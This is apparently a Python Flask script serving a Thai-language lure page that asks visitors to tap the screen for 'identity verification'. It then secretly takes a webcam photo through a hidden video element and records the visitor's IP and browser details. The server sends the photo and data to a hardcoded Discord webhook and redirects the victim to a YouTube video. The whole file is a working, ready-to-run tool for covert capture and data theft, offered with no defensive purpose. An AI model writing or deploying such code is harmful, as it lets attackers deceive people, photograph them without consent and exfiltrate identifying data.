from flask import Flask, request, jsonify
import requests
import base64
from datetime import datetime

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"

HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>แตะเพื่อดำเนินการ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea, #764ba2);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }
        .container { text-align: center; color: white; padding: 20px; }
        h1 { font-size: 1.8rem; margin: 20px 0; }
        .spinner {
            width: 45px; height: 45px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body onclick="start()">
    <div class="container" id="ui">
        <h1>แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
        <p>ระบบจะขออนุญาตใช้กล้องเพื่อยืนยันตัวตน</p>
    </div>
    <script>
        async function start() {
            document.body.onclick = null;
            document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1>';
            const info = { ua: navigator.userAgent, sw: screen.width, sh: screen.height };
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.createElement('video');
                v.style.display = 'none';
                document.body.appendChild(v);
                v.srcObject = s;
                await v.play();
                await new Promise(r => setTimeout(r, 800));
                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const img = c.toDataURL('image/jpeg', 0.8).split(',')[1];
                await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ info, image: img })
                });
                s.getTracks().forEach(t => t.stop());
            } catch(e) {
                await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ info, image: null })
                });
            }
            window.location.href = "https://www.youtube.com/watch?v=I8o8IOXAeFQ";
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        info = data.get('info', {})
        img_b64 = data.get('image')
        img_data = base64.b64decode(img_b64) if img_b64 else None
        ip = request.remote_addr
        msg = f"IP: {ip}\nUA: {info.get('ua', '')[:80]}"
        payload = {"username": "Security", "content": msg}
        files = {'file': ('photo.jpg', img_data, 'image/jpeg')} if img_data else {}
        requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        return "OK", 200
    except:
        return "Error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)